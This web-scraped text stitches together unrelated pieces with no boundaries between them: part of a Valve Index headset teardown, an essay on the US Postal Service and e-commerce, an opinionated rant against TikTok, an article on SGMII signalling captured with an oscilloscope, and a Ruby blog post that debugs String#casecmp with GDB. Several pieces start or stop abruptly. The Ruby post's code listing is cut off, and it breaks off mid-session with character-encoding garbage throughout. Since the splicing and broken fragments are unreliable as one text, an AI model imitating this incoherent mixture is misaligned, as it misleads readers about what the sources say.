<p>Next are these two microchips. The smaller one is a <a href="https://www.analogix.com/en/products/dp-mipi-converters/anx7530">SlimPort® 4K receiver from Analogix</a>. It is capable of receiving Image in 4K at 60 Hz, but since screens in Valve Index are only 1440 by 1600 pixels it allows to process video at 90, 120, and even 144 Hz. It also splits the signal in two allowing each display to get its own image.</p>

<p><img src="https://www.thevrist.com/assets/images/index10.jpg" alt="">
<em>Video chips convert image that you see in your SteamVR mirror in beautiful VR image</em></p>

<p>Larger chip is a multipurpose <a href="https://www.digikey.com/products/en/integrated-circuits-ics/embedded-fpgas-field-programmable-gate-array/696?k=ICE40HX8K">FPGA (Field Programmable Gate Array) chip from Lattice Semiconductor</a>. It is used for tracking - all the data received from the tracking sensors is gathered here. This chip combined with the <a href="http://ww1.microchip.com/downloads/en/DeviceDoc/Atmel-11289-32-bit-Cortex-M4-Microcontroller-SAM-G55_Summary-Datasheet.pdf">Atmel MCU</a> (located on the other side of the circuit board) are doing all the necessary tracking calculations.</p>

<p><a href="http://www.etron.com.tw/cn/products/webcam_detial.php?Product_ID=10">EtronTech microchip</a> is used for merging video feeds from external cameras and transmitting it to your PC.</p>

<p><img src="https://www.thevrist.com/assets/images/index11.jpg" alt="">
<em>Microchip for processing image from webcams</em></p>

<p>Last two chips on this side of the circuit from <a href="https://www.silabs.com/power/efp01-power-management-ic">SiliconLabs</a> are most likely related to power regulation. Both of them are located near the capacitors and an inductor (metal thingy with 150 written on it). These are making sure that nothing will get too hot on your face.</p>

<p><img src="https://www.thevrist.com/assets/images/index12.jpg" alt="">
<img src="https://www.thevrist.com/assets/images/index13.jpg" alt="">
<em>Power regulating microchips</em></p>

<p>Next step is to remove the main circuit board and look on its other side. Other side is less interesting and has very little information to offer. Most parts are related to the power regulation mentioned in the previous paragraph.</p>

<p><img src="https://www.thevrist.com/assets/images/index14.jpg" alt="">
<em>Back side of the main circuit board</em></p>

<p>Largest chip is an Atmel MCU, which I’ve already mentioned is related to the tracking system. On the left from it is a <a href="https://www.nxp.com/docs/en/data-sheet/LPC11U1X.pdf">microcontroller from NXP</a>. These are all the chips we managed to identify. One chip that is missing, is the additional Bluetooth module. Unlike Vive and Vive Pro, Index has bluetooth in the headset. It is used for connecting to the base stations, updating base station firmware, and sending them to sleep mode when the headset is turning off. Last one is completely optional - I prefer to keep my base stations 2.0 on all the time.</p>

<p><img src="https://www.thevrist.com/assets/images/index14-2.jpg" alt="">
<em>The only two chips worth noting on this side of the motherboard - larger one is for tracking calculations</em></p>

<p>Why there is no separate Bluetooth chip for this purpose is still a mystery for me. Only possible explanation is that two Bluetooth chips for controllers are capable of switching to different modes and control the base stations.</p>

<h2 id="screens">Screens</h2>

<p>After the circuit is removed you will reveal several key components. First - you can see two displays - quick search shows that those panels are made by BOE Technology - Chinese display manufacturer. Those are 1440×1600, 615PPI 3.5” <a href="https://www.panelook.com/VS035ZSM-NW0-69P0_BOE_3.5_LCM_overview_37926.html">panels</a>.</p>

<p><img src="https://www.thevrist.com/assets/images/index15.jpg" alt="">
<em>View of the HMD with main board removed</em></p>

<p>Note some key elements in this view. On the bottom there is a circular mechanism with a metal pin with springs going through the whole headset. Similar pin is barely visible on the top of the headset. This is an IPD adjustment system - movement of the knob at the bottom of the HMD will rotate circular element in the bottom center which will push screens apart.
On the left and right sides of HMD you can see black gears - this is a system for eye relief - rotating a knob on the side of the headset will move the facemask relatively to the screens. Gear system is making sure both sides are rotating simultaneously, without giving too much pressure to the mechanism.</p>

<p><img src="https://www.thevrist.com/assets/images/index16.jpg" alt="">
<em>IPD knob is actually a screw</em></p>

<p>In order to take the central part out from the headset, you will need to take the cap off the IPD adjustment knob and unscrew it.</p>

<p><img src="https://www.thevrist.com/assets/images/index17.jpg" alt="">
<em>Lens chambers with IPD mechanism still attached</em></p>

<p>Next was what I call the “wondering in the dark” part of teardown - for about 30 minutes we were trying to find a way of taking it apart without breaking anything, eventually using force to break one gear inside that was holding display chambers in place.</p>

<p><img src="https://www.thevrist.com/assets/images/index18.jpg" alt="">
<em>Right eye lens chamber removed</em></p>

<p>After this step you can easily take off separate lens chambers and view the details. Chambers are sealed shut so nothing will get inside - they are assembled in perfectly clean conditions with no dust particles. 
In order to take it apart you can probably try to melt glue or something like that. But we are no iFixit, we used good ol’ force. Here you can see the screen separated from the chamber.</p>

<p><img src="https://www.thevrist.com/assets/images/index19.jpg" alt="">
<img src="https://www.thevrist.com/assets/images/index20.jpg" alt="">
<em>BOE screen removed from the chamber</em></p>

<p>Screen has a polarised diffuser glued to it, which is particularly difficult to remove. It is made of very thin crystal glass and it cracks easily. You can see that the corners of it are cracked.</p>

<p><img src="https://www.thevrist.com/assets/images/index21.jpg" alt="">
<em>Crystal polarisation diffuser</em></p>

<p>Diffuser is added to blend pixels better, making the screen door effect even lower.</p>

<p><img src="https://www.thevrist.com/assets/images/index22.jpg" alt="">
<em>Fancy multilayered lens</em></p>

<p>Finally - the lenses. I was expecting them to be thicker with the effect that they create. Valve are saying “The custom lenses built into the Valve Index Headset maximize field of view without sacrificing edge-to-edge clarity. High geometric stability allows you to look around the scene by moving your eyes (not just your head) with minimal shape distortion”. I tend to agree that these are the most advanced lenses in modern mass produced HMD, even though they have their own flaws. Main issue is the light spill when using a headset, you can see the bright light’s reflections in spots where they shouldn’t be.</p>

<h2 id="final-thoughts">Final thoughts</h2>

<p>As you can clearly see, it is not possible to replace a damaged screen or scratched lens all by yourself (even though for latter one you might try to take the lens out using a suction cup, however I don’t think that is a good idea, as lenses and screens are calibrated in the factory).</p>

<p><img src="https://www.thevrist.com/assets/images/index-end.jpg" alt="">
<em>Sometimes… I feel like a monster…</em></p>

<p>I am going to put the high-resolution images of the teardown and of the motherboard <a href="https://photos.app.goo.gl/dhuPVWTu6P5XWo4HA">here</a> so you can see and check all the details by yourself.

<p>There are three types of infrastructure. One is visible: roads, dams and bridges. The second is invisible: broadband internet provisions and the entirety of our cellular infrastructure. Both are still vital in building our present. The third form of infrastructure is one being rebuilt in order to be repurposed for future use. I explained in <em>J-Curves and Agglomeration</em>:</p>
<blockquote><p>The U.S. Postal Service is a key component of the eCommerce economy. Packages are just 5% of its shipping volume but eCommerce accounts for nearly 30% of the agency’s revenue. Partnerships with vendors like Amazon (or providers like FedEx and UPS) provide a majority of its package volume but small businesses and direct-to-consumer brands rely on USPS’ pricing. Raising costs on retailers may lead to more attrition. […]</p>
<p>By raising prices to combat Amazon’s growing influence over the economy, disrupting the postal economy is no different than digging up paved roads before a period of heightened freight transit. [<a href="https://2pml.com/2020/05/18/agglomeration/">2PM, 1</a>]</p></blockquote>
<p>The U.S. Postal Service is all three. When an American institution is 250 years old, it may as well be the ground that we stand on. The service has contributed services and innovations that we don’t readily attribute to it. Consider its contribution to the middle class: the U.S. Postal Service is one the country’s biggest employers with nearly 330,000 career employees and an average salary of $50,000. They are building the future of eCommerce, a still-nascent industry.</p>
<p>Critics of the USPS will cite cost of labor as a reason for the service’s obsolescence. A common refrain is “Why couldn’t Amazon takeover the service?” Consider that in the fourth quarter of 2019, eCommerce was just 11.9% of all retail. Amazon constituted right under half of that volume. And without the postal service, Amazon would not exist. The market costs of shipment subsidized a number of Amazon’s operations, allowing it to capture market share.</p>
<h2>“The Ground We Stand On”</h2>
<p>The postal service began before the founding of the United States. Benjamin Franklin was fired from his role as postmaster due to his involvement with the American Revolution. Just one year later in 1775, the Continental Congress appointed Franklin the Postmaster General of the “United Colonies.” His tenure left a mail system that offered service between the then-colonies and Great Britain. By 1802, the first African-Americans to work for the Postal Service were enslaved mail carriers. Senator James Jackson of Georgia, Chairman of the Committee of the Senate on the Post Office Establishment, once wrote:</p>
<blockquote><p>… The most active and intelligent [slaves] are employed as post riders. By travelling from day to day, and hourly mixing with people […] they will acquire information. They will learn that a man’s rights do not depend on his color. They will, in time, become teachers to their brethren.</p></blockquote>
<p>Within two months of Senator Jackson’s proclamation, African-Americans would be banned from the postal service, lasting from 1802 to March 1865, just one month before the conclusion of the Civil War. This disbarment ended by congressional decree.</p>
<blockquote><p>No person, by reason of color, shall be disqualified from employment in carrying the mails. (13 Stat. 515)</p></blockquote>
<p>The next decades would see an unparalleled push for African-American financial stability. Nearly 800 would serve as postal employees prior to the 20th century. More than 200 African Americans are known to have served in the high rank of postmaster prior to the conclusion of Reconstruction and the Progressive Era (1863-1920). Of them, nearly 20 were women. The postal service has always been politicized.</p>
<p>Soon after, the U.S. Government expanded on the postal service’s role in democratizing America, both literally and figuratively. President Theodore “Teddy” Roosevelt expanded on this with the <em>Square Deal</em> in 1902, communicating a fairness policy in hiring and leadership. The result was momentous for many. Roosevelt stated:</p>
<blockquote>
<p>It is and should be my consistent policy in every State, where their numbers warranted it, to recognize colored men of good repute and standing in making appointments to office. […] I can not consent to take the position that the door of hope – the door of opportunity – is to be shut upon any man, no matter how worthy, purely upon the grounds of race or color. <a href="https://about.usps.com/who-we-are/postal-history/african-american-workers-20thc.htm#_edn2" name="_ednref2">[2]</a></p>
</blockquote>
<p>Today, 21% (or nearly 70,000) of the agency’s employees are African-American. However, the postal service was consequential beyond matters of social equity. By 1823, the U.S. Postal Service and the U.S. Government established 80,000 miles of “post roads” to help carriers navigate new rural areas. By 1860, these roads connected nearly 28,000 post offices. Today, the postal service maintains nearly 40,000 post offices, clearing 212 billion letters and mail to 144 million homes.</p>
<blockquote data-card-controls="1" data-card-align="center" data-card-theme="light" data-card-key="3101080c845e4679b6077080f81a573e">

<p>Save the @USPS.There is no institution more critical to the next phases of our commerce economy.</p>
</blockquote>

<p>Today, the service is tasked with another generational shift: supporting online retail. The pandemic shifted the American consumer towards online retail, this while reducing the number of units shipped. As such, companies like UPS and FedEx have responded by hiking prices. In response to USPS’ distress, FedEx recently stated:</p>
<blockquote>
<p>The COVID-19 pandemic has negatively impacted mail volumes and mix resulting in a further decrease in revenues and negative financial impact for the USPS. Additionally, the USPS continues to experience budgetary uncertainty as well as increased political debate regarding potential privatization or restructuring of its operations.</p>

<p>Cost inflation is the most concerning obstacle ahead for digitally native retailers. Without the treatment that the United States’ oldest civilian service afforded Amazon in its infancy, it will be more difficult to build more businesses of Amazon’s scale. The economics were difficult enough as is; these added costs will only add pressure to pass along costs to consumers, many of whom are facing down one of the most economically vulnerable periods since 2008.We should consider the postal service an investment into our present and future and a monument to our past.</p>
<p>If our economy is to begin addressing the shortfalls caused by the overwhelming contraction in the traditional retail industry, it will need the support of the postal service. For eCommerce, their service is the industry’s last mile for thousands of direct-to-consumer small businesses. The postal service uniquely sits at the intersection of our physical roads and our digital infrastructure. There isn’t a direct substitute and we shouldn’t wait to find out the hard way. Save the USPS. We will need more companies like the the successful hundreds that were built on its 250 year old infrastructure. That includes Amazon.</p>

Trump doesn’t like TikTok. He doesn’t like Tik-Tok because of the Chinese. Apparently, they use it for espionage. That’s why he wants the app banned in the United States. He also wants to ban the WeChat app. He has already issued a decree to do this. (<a href="https://www.tagesschau.de/ausland/trump-tik-tok-verfuegung-101.html" target="_blank" rel="noopener noreferrer">1</a>, <a href="https://www.heise.de/news/Analyst-Trump-Verfuegung-gegen-WeChat-schaedigt-iPhone-Geschaeft-4866876.html" target="_blank" rel="noopener noreferrer">2</a>)</p><p>TikTok is a video app. Entertainment on the go. WeChat is an app for communication and even with payment function. Mainly used in China.</p><p>I am over 40 years young. I had already heard TikTok. But I have never used it. I do not have the time for that. A few days ago, a visitor came to see my daughter. The girl had TikTok on her smartphone. She explained the app to me and I observed how it was used.</p><p>I had made a judgement very quickly. I have to test TikTok. Installed on my test phone and started. At the beginning you choose a few categories to get started. I chose humorous, learning and society. The consumption of videos should finally bring me some value. The good thing is that everyone of you can test the app that way. A registration beyond this level is not necessary for the consumption. Only those who want more would have to open an account.</p><p>I had planned to test TikTok for two hours. It should already be one movie length to make a judgement. If my daughter’s classmates use this app, she will sooner or later come across TikTok as well.</p><p>I have given myself the additional task of keeping a tally sheet. I wanted to know how many videos I watch in the two hours and how many videos I have to laugh or take something positive with me. It is not about casual laughter when there is a small funny scene, but hearty, beautiful laughter. Knowledge must trigger an eye-opening effect.</p><p>And so it began … and I was there for 24 minutes. After that I was completely exhausted.</p><p>I consumed 74 videos. I laughed once.</p><p>TikTok is continuous bombardment with short videos. The <a href="https://en.wikipedia.org/wiki/Katyusha_rocket_launcher" target="_blank" rel="noopener noreferrer">Stalin organ</a> of entertainment. You can really feel how big parts of your own brain explode and are useless afterwards.</p><p>TikTok is the cruelest app, the worst entertainment I have ever experienced. I have seen different actors performing the same sketch. I’ve seen German stars in bad performances. I’ve seen people acting as if they already have no brain at all. I’ve seen young people acting as if they were the children of adults who have no brains. It was a culture shock.</p><p>I can’t explain how bad, how underground, how primitive the content if TikTok is. Respect for every TikTok entertainer who produces trash every day and finds fans who give him presents for it. I don’t know if it should be the goal of life to produce trash, but 24 minutes showed me that nuclear waste is less toxic than the contents on TikTok.</p><p>TikTok does not exist in our household. The domains are blocked in the router. It is completely irresponsible to let underaged people use this app. At Apple and in the Google Play Store the app is listed from 12 years of age. And just like my daughter, however, the visitor was younger than 12 years. And according to her, many of her classmates use this app. Do parents buy their children smartphones to turn them into zombies on purpose? Terrifying. TikTok is proof that parents who don’t monitor their children’s online use must be severely punished.</p><p>TikTok should not be banned for fear of Chinese espionage. TikTok should be banned for being stupid on a massive scale. A realistic classification would be from the age of 18. Then it would be ensured that ex-minors can only go through this garbage dump of do-it-yourself entertainment when it can be assumed that they have developed a few brain cells.</p><p>If you have never tested TikTok, but there are people in the household who consume the contents, then inform yourself.

<h2>Overview</h2>
<p>
	This article reviews various SGMII (&amp; 1000BASE-SX) concepts that
	are integral to our <a href="https://mindchasers.com/privateisland">Private Island™</a> project
	and its current soft Verilog <a href="https://mindchasers.com/repos/cgit.cgi/privateisland/tree/source/mac.v" target="_blank">MAC layer</a>. We provide oscilloscope screen shots
	below from our Rohde &amp; Schwarz RTO to help illustrate the concepts.
</p>

<p>
	As shown in the block diagram below, Private Island utilizes a Lattice
	Semiconductor <a href="https://mindchasers.com/dev/pi-lattice-ecp5" target="_blank">ECP5UM</a> FPGA<sup><a href="#note1">1</a></sup> to
	interface SGMII Gigabit Ethernet PHYS and other SERDES 8B10B
	peripherals. Unlike a typical SoC, the FPGA is capable of asserting an
	external interrupt synchronous to specific packet transmit or receive
	events. The interrupt can also assert on specific octets / special
	codes within the Ethernet frame (i.e., end of packet). This interrupt
	flexibility is important for certain security functions and provides a
	reliable and predictable way to trigger our scope during debug of the
	SGMII / SERDES bus for both hardware and software debug.
</p>

<p>For the oscilloscope screen shots provided in this article, the
	FPGA is configured as a transparent bridge between an Ethernet switch
	and an embedded Linux node. Certain received Ethernet frames from the
	LAN are mirrored onto a TAP port with the simultaneous assertion of an
	interrupt line. Oscilloscope probes are applied to the interrupt line
	and the SGMII TAP port.</p>

<p>
	The tap port can be realized today with <a href="https://mindchasers.com/dev/darsena-hw-spec" target="_blank">Darsena</a> using a third Ethernet port provided by our
	<a href="https://mindchasers.com/dev/hw-gige-shield" target="_blank">Gigabit Ethernet
		shield</a> or using our <a href="https://mindchasers.com/dev/hw-high-speed-shield" target="_blank">SMA
		shield</a>. In the former case, a differential probe is placed across a
	pair of AC coupling caps. In the latter case, SMA to BNC cables are
	used to directly connect to the oscilloscope. Note that we're also in the process
	of developing a Gigabit optical transceiver shield to support
	1000BASE-SX.

<h2>Brief overview of popular PHY Interfaces</h2>

<ul>

	<li>GMII, which is specified by IEEE 802.3-2015 defines a separate
		8-bit bus for transmit and receive data plus several signals to convey
		additional information between the MAC and PHY. GMII is based on MII,
		which is defined in Clause 22. In addition to the data buses and
		control signals, GMII requires two 125 MHz bit clocks: GTX_CLK and
		RX_CLK</li>
	<li>RGMII, which was defined by HP, Broadcom, and Marvell, reduces
		the pin count primarily by utilizing separate 4-bit buses for transmit
		and receive and both edges of the bit clocks (double data rate).</li>
	<li>SGMII, which was defined by Cisco, utilizes two pairs of
		SERDES / LVDS differential buses to carry transmit and receive data at
		1.25 Gbps. Differential clocks are defined but are optional and
		typically not used. Instead, the clocks are recovered from the data on
		the differential pairs. The data is encoded using an 8B/10B coding
		scheme, which is specified in clause 36 of 802.3-2015. The effective
		bit rate is 8 / 10 * 1.25 Gbps = 1.0 Gbps, as you would expect. The
		out-of-band information conveyed by the GMII control signals (TX_EN,
		TX_ER, RX_ER, and RX_DV) are replaced by special code groups (K
		values). This enables conveying information such as configuration,
		line state, and carrier events between the MAC and PHY.</li>
</ul>

<h2>SGMII Hardware Signaling</h2>

<p>
	The SGMII specification provides its own definition of LVDS, which is
	derived from <a href="http://standards.ieee.org/findstds/standard/1596.3-1996.html" target="_blank">IEEE 1596.3-1996</a>. However, the parameters provided
	in the SGMII specification are defined in the IEEE specification. For
	the purpose of SGMII hardware signaling, these two specifications are
	sufficient. PHY vendors often refer to this specification rather than
	providing their own numbers. Note that LVDS in general is an industry
	standard, and is defined in EIA/TIA-644A. A great resource for LVDS and
	differential signaling is the <a href="http://www.ti.com/litv/pdf/snla187" target="_blank">TI /
		National LVDS Owners Manual</a>.
</p>

<p>The figure below provides a very simple schematic of LVDS
	signaling. The concept being conveyed is that the transmitter drives a
	small current across a 100 ohm load in the receiver in one of two
	directions to produce either a positive or negative voltage across the
	receiver (Vod). This small current is superimposed over a common
	voltage (Vos), typically 1.2V. The industry standard LVDS specifies a
	3.5 mA driver current. The SGMII specification implies it is less since
	|Vod| max is 400 mV. In practice, most SGMII drivers (e.g., PHYs)
	support the configuration of multiple drive levels.</p>

<p>The next figure shows an oscilloscope screen shot of an SGMII bus
	using a 4.5 GHz differential probe (RT-ZD40). The probe tips are placed
	on the two AC coupling caps of the differential SGMII bus. The yellow
	signal is the SGMII signal, and the blue square wave is generated from
	the scope's HW CDR math function. A probe meter function is shown in
	the lower right. This is a feature / function of the probe and shows
	that the common mode voltage (Vos) is near 1.2V</p>

</figure>

<p>The next screen shot shows an SGMII eye diagram with 100 ms
	persistence enabled. As expected, the unit interval (UI) is
	approximately 800 ps. As can be seen in the upper right, the trigger is
	the built-in HW CDR.</p>

<h2>A Look at SGMII Special Code Groups</h2>

<p>Clause 36 of 802.3-2015 defines certain 10-bit values as K values
	to convey non-data (out of band) information between the MAC and PHY.
	These K values take the place of the GMII control signals and special
	encodings of the GMII data bus. For Example, /K27.7/ defines a start of
	packet on the SGMII bus.</p>

<p>Referring to 802.3 Table 36-2 (valid special code-groups) and the
	screen shot below, we can see that K27.7 is defined as the bit sequence
	001001 0111 ([a..j] with 'a' transmitted first). This screen shot was
	taken using two single ended SMA cables (see figure below) and utilizes
	the 8B/10B protocol decode function equipped with our RTO. Note that
	that when the orange waveform is positive, the signal is a 1 and when
	the blue waveform is positive the signal is a 0.</p>

<p>The '+' after K27.7 indicates that the 10-bit waveform has a
	currently positive running disparity. Each code, both special and data,
	can either have a current positive or negative running disparity, and
	this indicates the difference of the total number of 1's and 0's on the
	wire. Refer to 802.3 clause 36.2 and Annex 36B for the details on
	running disparity and its rules.</p>

<h3>Ordered Sets</h3>

<p>802.3 defines ordered sets (Table 36-3) that consist of one or
	more code groups, each of which starts with a special code group (K
	value). For example, /I2/ specifies the IDLE2 line state and is encoded
	by /K28.5/D16.2/. This waveform continually repeats while the line
	remains in a powered up idle state, and is shown in the figure below.</p>

<ul>
	<li>K28.5-: 001111 1010
	</li><li>D16.2+: 100100 0101
</li></ul>

<h2>Data and Packets on an SGMII Bus</h2>

<p>The next figure shows a captured packet preamble on an SGMII bus.
	Per 802.3 35.2.3.2.1 and 36.2.4.14, An /S/ code (start of packet
	delimiter, K27.7) replaces the first octet of the preamble followed by
	the remaining PREAMBLE/SFD sequence: 0x55 0x55 0x55 0x55 0x55 0x55
	0xD5.</p>

<p>Note in the figure below that the special code groups (K) are
	shown in blue and the data code groups (D) are shown in yellow.</p>

	<figcaption>SGMII Preamble</figcaption>
	<img src="https://mindchasers.com/static/images/hw-sgmii-review/scope-sgmii-sop.png" alt="SGMII Start of Packet">
</figure>



<p>
	Our last scope screen shot shows a complete packet captured. The FPGA's
	interrupt line is used to trigger the scope synchronously with the
	reception of the packet on the TAP port. The scope trace highlights the
	functionality of the 8B/10B protocol decode feature, showing the full
	decode results in a table and a search result box looking for the K27.7
	special code group, which appears on the SGMII bus 60.46 ns after the
	interrupt. <em>This certainly gives new meaning to the term packet
		inspection.</em>

<h3>1000Base-SX</h3>

<p>It's important to note that SGMII is derived from 1000BASE-SX,
	which is defined in 802.3 Section 3. 1000BASE-SX is a specification for
	Ethernet over Fiber, and it utilizes 8B/10B coding for out of band
	signaling.</p>

<p>Note that we are currently developing an SFP Shield to support
	optical transceivers for 1000BASE-SX.</p>

<p>
	The figure below shows Darsnea in series with a low cost <a href="https://www.amazon.com/gp/product/B074WS6J3M/ref=as_li_ss_tl?ie=UTF8&amp;psc=1&amp;linkCode=ll1&amp;tag=mindchasers08-20&amp;linkId=1f9e1f051056ca92fe1a503b0eeae9dd&amp;language=en_US" target="_blank">Optical Media Adapter</a>. The great thing about this
	particular media adapter is that it has AC coupling caps on the PCB
	(even though they're not required). Therefore, we can use our diff
	probe to monitor both the transmit and receive data between the optical
	transceiver and the adapter's ASIC/SoC. If you're in the market for a
	low cost optical-to-electrical converter, this might be a good choice.

<p>I noticed something odd today while working on two different Ruby codebases. This simple line of Ruby behaved differently in both applications:</p>

<div><div><pre><code><span>"luck"</span><span>.</span><span>casecmp</span><span>(</span><span>"L`auguste"</span><span>)</span>
</code></pre></div></div>

<p>Executing <code>"luck".casecmp("L`auguste")</code> in application A returned <code>-1</code>, while executing it in application B returned <code>1</code>.</p>

<p>â€œDid the alphabet change at some point and I didnâ€™t get the memo?â€�, I thought.</p>

<blockquote>
  <p><strong>Aside</strong></p>

  <p><a href="https://ruby-doc.org/core-2.7.1/String.html#method-i-casecmp"><code>String#casecmp</code></a> is a built-in Ruby method that returns <code>-1</code>, <code>0</code>, <code>1</code>, or <code>nil</code> depending on whether the object on which itâ€™s called is less than, equal to, or greater than the function argument, and it does so in case-insensitive fashion. Here are a few simple examples of how it behaves:</p>

  <div><div><pre><code><span>"aBcDeF"</span><span>.</span><span>casecmp</span><span>(</span><span>"abcde"</span><span>)</span>     <span>#=&gt; 1</span>
<span>"aBcDeF"</span><span>.</span><span>casecmp</span><span>(</span><span>"abcdef"</span><span>)</span>    <span>#=&gt; 0</span>
<span>"aBcDeF"</span><span>.</span><span>casecmp</span><span>(</span><span>"abcdefg"</span><span>)</span>   <span>#=&gt; -1</span>
<span>"abcdef"</span><span>.</span><span>casecmp</span><span>(</span><span>"ABCDEF"</span><span>)</span>    <span>#=&gt; 0</span>
</code></pre></div>  </div>
</blockquote>

<h2 id="looking-for-monkey-patches">Looking for monkey patches</h2>

<p>Seeing as one of the applications is built on top of Ruby of Rails and the other isnâ€™t, my first thought was that maybe there was a Rails and/or ActiveSupport patch on <code>String#casecmp</code> that would change the behavior of this line in one of the applications. However, I didnâ€™t find anything that pointed to this. I kept digging, hoping to maybe find a patch in the <em>other</em> application that could explain this difference in behavior. Again, I didnâ€™t find anything. ðŸ™ˆ</p>

<h2 id="different-rubies">Different Rubies</h2>

<p>Eventually, after exploring a bit more, I realized that both applications ran on different versions of Ruby: application A was on Ruby 2.6, while application B was using Ruby 2.7.</p>

<p>Running the same command on both versions of Ruby indeed gives us different results:</p>

<div><div><pre><code><span>$ </span>~/.rubies/ruby-2.6.6/bin/ruby <span>-e</span> <span>'puts "luck".casecmp("L`Auguste")'</span>
<span>-1</span>

<span>$ </span>~/.rubies/ruby-2.7.0/bin/ruby <span>-e</span> <span>'puts "luck".casecmp("L`Auguste")'</span>
1
</code></pre></div></div>

<p>Ah ha! Weâ€™re getting closer. While I could have called it a day here and simply updated application B to Ruby 2.7 to resolve the issue, I wanted to understand: what causes it?</p>

<h2 id="changelogs--bindingpry">Changelogs &amp; <code>binding.pry</code></h2>

<p>I then started to comb through Ruby changelogs, trying to find if anything changed between Ruby 2.6 and Ruby 2.7 for <code>String#casecmp</code>, or anything somehow related to string comparison. I didnâ€™t find anything.</p>

<p>Of course, it would be nice to debug this using <code>binding.pry</code> or other similar Ruby-level debugging tools by stepping into the <code>String#casecmp</code> call to see whatâ€™s going on inside. However, this doesnâ€™t get us very far, as trying to use Rubyâ€™s <code>Tracer</code> or <code>binding.pry</code> doesnâ€™t really help.</p>

<p>Running this:</p>

<div><div><pre><code><span>$ </span>ruby <span>-r</span> tracer <span>-e</span> <span>'"luck".casecmp("L`Auguste")'</span>
</code></pre></div></div>

<p>â€¦ returns this output:</p>

<div><div><pre><code>#0:-e:1::-: "luck".casecmp("L`Auguste")
</code></pre></div></div>

<p>â€¦ and not much else. Thatâ€™s because <code>String#casecmp</code> is implemented in C, directly inside MRIâ€™s <a href="https://github.com/ruby/ruby/blob/master/string.c"><code>string.c</code></a>, so thereâ€™s no actual Ruby code underneath <code>String#casecmp</code> that we can step into using Ruby-level debugging tools.</p>

<p>Here comes the GDB part: because weâ€™re essentially dealing with C code at this point, we can use GDB to understand what happens inside the call to <code>String#casecmp</code>. So with that, I fired up GDB for the first time in years (I typically work with Ruby, so GDB is not something I commonly use).</p>

<h2 id="identifying-the-root-cause-using-gdb">Identifying the root cause using GDB</h2>

<p>Letâ€™s see how to use GDB to understand why both Ruby 2.6 and Ruby 2.7 behave differently with the same input to <code>String#casecmp</code>.</p>

<p>I first prepared a simple Ruby file containing the source that replicates the issue:</p>

<div><div><pre><code><span># ~/casecmp.rb</span>
<span>puts</span> <span>"luck"</span><span>.</span><span>casecmp</span><span>(</span><span>"L`Auguste"</span><span>)</span>
</code></pre></div></div>

<p>Notice that the second character in the input to <code>casecmp</code> is a backtick (<code>`</code>), which has ASCII code 96. This is relevant for paragraphs below.</p>

<h3 id="in-ruby-270">In Ruby 2.7.0</h3>

<p>Letâ€™s start by firing up GDB with a self-compiled version of Ruby 2.7.0:</p>

<div><div><pre><code><span>$ </span><span>sudo </span>gdb /Users/maximevaillancourt/.rubies/ruby-2.7.0/bin/ruby
Reading symbols from /Users/maximevaillancourt/.rubies/ruby-2.7.0/bin/ruby...
</code></pre></div></div>

<p>Then, we add a breakpoint on the <code>str_casecmp</code> function so execution pauses once we reach it:</p>

<div><div><pre><code>(gdb) break str_casecmp
Breakpoint 1 at 0x1001fa766: file string.c, line 3371.
</code></pre></div></div>

<p>Perfect. Weâ€™re now ready to run the <code>casecmp.rb</code> Ruby script from above.</p>

<div><div><pre><code>(gdb) run casecmp.rb
Starting program: /Users/maximevaillancourt/.rubies/ruby-2.7.0/bin/ruby casecmp.rb
</code></pre></div></div>

<p>We eventually hit the breakpoint we just set:</p>

<div><div><pre><code>Thread 2 hit Breakpoint 1, str_casecmp (str1=4329352680, str2=4329352640) at string.c:3371
3371	    enc = rb_enc_compatible(str1, str2);
</code></pre></div></div>

<blockquote>
  <p><strong>Aside</strong></p>

  <p>Internally, <a href="https://github.com/ruby/ruby/blob/4318aba9c94ebff53e4168886e1a35a24013924f/string.c#L3467-L3468"><code>String#str_casecmp</code></a> is quite simple: it iterates over each character in both inputs by index starting from the first character, converting both characters to the same case so that the function behaves in a case-insensitive way, and returns early if the two currently considered characters from each input are different. In doing so, it determines which character is â€œbiggerâ€� than the other using the character code (an <a href="http://www.asciitable.com/">ASCII code table</a> is a useful asset to have nearby for the rest of this blog post).</p>
</blockquote>

<p>In Ruby 2.7.0, notice that the case conversion <a href="https://github.com/ruby/ruby/blob/e9e4f8430a62f56a4e62dd728f4498ee4c300c12/string.c#L3381-L3382">converts both inputs to lowercase using <code>TOLOWER</code></a>:</p>

  <span>p1</span><span>++</span><span>;</span>
  <span>p2</span><span>++</span><span>;</span>
<span>}</span>
</code></pre></div></div>

<p>After navigating in <code>str_casecmp</code> using <code>next</code> a few times, we enter the loop and arrive at a point where we can print <code>c1</code> and <code>c2</code>, which are the codes for the characters at the current index for both inputs:</p>

<div><div><pre><code>3382	                unsigned int c2 = TOLOWER(*p2 &amp; 0xff);
(gdb) print c1
$11 = 108
(gdb) next
3383	                if (c1 != c2)
(gdb) print c2
$12 = 108
</code></pre></div></div>

<p>Hereâ€™s a visual representation of the buffers:</p>

<div><div><pre><code>c1
 â†“
108  ?   ?   ?
 l   u   c   k

108  ?   ?   ?   ?   ?   ?   ?   ?
 l   `   a   u   g   u   s   t   e
 â†‘
c2
</code></pre></div></div>

<p>108 is the decimal ASCII character code representation for the first letter of both inputs: <code>l</code> (lowercase â€œLâ€�), so the loop continues to the next iteration because <code>c1</code> and <code>c2</code> are the same.</p>

<p>On the second iteration of the loop (on the second character of both inputs), we get the following results:</p>

<div><div><pre><code>3382	                unsigned int c2 = TOLOWER(*p2 &amp; 0xff);
(gdb) print c1
$14 = 117
(gdb) next
3383	                if (c1 != c2)
(gdb) print c2
$16 = 96
</code></pre></div></div>

<p>Hereâ€™s a visual representation of the buffers:</p>

<div><div><pre><code>    c1
     â†“
108 117  ?   ?
 l   u   c   k

108  96  ?   ?   ?   ?   ?   ?   ?
 l   `   a   u   g   u   s   t   e
     â†‘
     c2
</code></pre></div></div>

<p><code>c1</code> contains <code>117</code>, which is the decimal ASCII character code representation for <code>u</code>, while <code>96</code> (in <code>c2</code>) is the character code for a backtick (<code>`</code>). We then enter the <code>if (c1 != c2)</code> conditional, and the return value is <code>1</code> because <code>c1 &gt; c2</code> (<code>117 &gt; 96</code>).</p>

<p>Okay. So far so good. This lines up with the initial observation of the issue. How are things different in Ruby 2.6.6?</p>

<h3 id="in-ruby-266">In Ruby 2.6.6</h3>

<p>We do almost the same setup as above (same one-line Ruby script to replicate the issue, same breakpoint on <code>str_casecmp</code>), but we fire up GDB with Ruby 2.6.6:</p>

<div><div><pre><code><span>$ </span><span>sudo </span>gdb /Users/maximevaillancourt/.rubies/ruby-2.6.6/bin/ruby
